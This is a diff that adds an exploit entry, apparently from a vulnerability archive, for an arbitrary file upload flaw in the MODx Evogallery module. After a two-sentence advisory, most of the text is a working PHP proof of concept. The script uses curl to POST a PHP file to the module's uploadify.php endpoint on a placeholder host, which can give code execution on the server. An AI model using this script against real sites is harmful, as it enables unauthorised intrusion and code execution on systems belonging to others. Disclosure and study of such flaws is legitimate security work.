@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/65646/info
+
+MODx Evogallery module is prone to an arbitrary file upload vulnerability.
+
+An attacker may leverage this issue to upload arbitrary files to the affected computer; this can result in arbitrary code execution within the context of the vulnerable application. 
+
+<?php
+$uploadfile="file.php"; 
+$ch = curl_init("demo.ltd/assets/modules/evogallery/js/uploadify/uploadify.php");
+curl_setopt($ch, CURLOPT_POST, true);   
+curl_setopt($ch, CURLOPT_POSTFIELDS,       
+array('Filedata'=>"@$uploadfile"));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+print "$postResult";
+?>
